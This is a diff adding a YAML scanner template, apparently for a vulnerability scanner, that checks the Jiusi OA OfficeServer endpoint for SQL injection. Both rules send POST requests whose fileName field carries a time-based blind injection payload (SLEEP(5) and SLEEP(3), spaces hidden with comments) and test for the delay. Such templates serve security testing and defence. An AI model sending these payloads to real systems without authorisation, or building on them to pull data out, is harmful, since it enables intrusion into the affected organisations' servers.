@@ -1,0 +1,25 @@
+name: 九思OA-officeserver接口sql注入漏洞
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 7
+matchCount: 2
+rules:
+  - method: POST
+    path: /jsoa/OfficeServer
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      isAjaxDownloadTemplate=true&fileName='/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(5)))T)/**/AND/**/'1'='1
+    expression:
+      sleep: 5
+      body_all: ["Untitled Document"]
+  - method: POST
+    path: /jsoa/OfficeServer
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      isAjaxDownloadTemplate=true&fileName='/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(3)))T)/**/AND/**/'1'='1
+    expression:
+      sleep: 3
+      body_all: ["Untitled Document"]
